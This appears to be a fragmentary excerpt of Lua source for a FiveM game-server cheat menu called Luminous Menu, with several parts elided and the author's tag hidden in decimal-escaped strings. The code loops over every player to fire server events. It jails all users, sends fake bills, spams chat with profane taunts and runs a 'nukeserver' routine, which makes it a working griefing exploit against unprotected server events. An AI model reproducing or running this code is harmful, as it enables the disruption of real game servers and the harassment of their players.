                    ...
                    function()
                        ...
                        for i = 0, 256 do
                            ...
                            udwdj(
                                ...
                                GetPlayerServerId(i),
                                'Purposeless',
                                '~g~\80\108\97\110\101\35\48\48\48\55\10 ~r~Luminous ~b~',
                                43161337
                            )
...
function nukeserver()
    Citizen.CreateThread(function()
        ...
        for bs=0,9 do
            udwdj("_chat:messageEntered","~r~",{141,211,255},"Luminous ~b~")
        end
    ...
    function()
        while waduyh487r64 do
			...
			if chatspam then
                ...
                udwdj('_chat:messageEntered', '^8LuminousMenu', {0, 0x99, 255}, '^3You just got fucked by Luminous ^2Made by Plane#0007 ^1Purchase at ^4')
				else
			...
			if banallusers then
				...
				udwdj("js:jailuser", GetPlayerServerId(i), 45 * 60, "~r~Got Fucked By Luminous ~g~\80\108\97\110\101\35\48\48\48\55\10 ~b~")
				udwdj("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "~r~Got Fucked By Luminous ~g~\80\108\97\110\101\35\48\48\48\55\10 ~b~")
					end
				end
      ...
      if IsControlPressed(0, 19) then
		...
		if discordPresence then
            ...
            SetRichPresence('Made by \80\108\97\110\101\35\48\48\48\55\10 | ')
...
for i, dA in pairs(bd) do 
        ...
        local SelectedPlayer
            ...
            elseif Plane.IsMenuOpened("\84\114\111\108\108\77\101\110\117\10") then
				...
				for i = 0, 128 do
                    udwdj('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Luminous Menu  \80\108\97\110\101\35\48\48\48\55\10", "6969696969")
                end
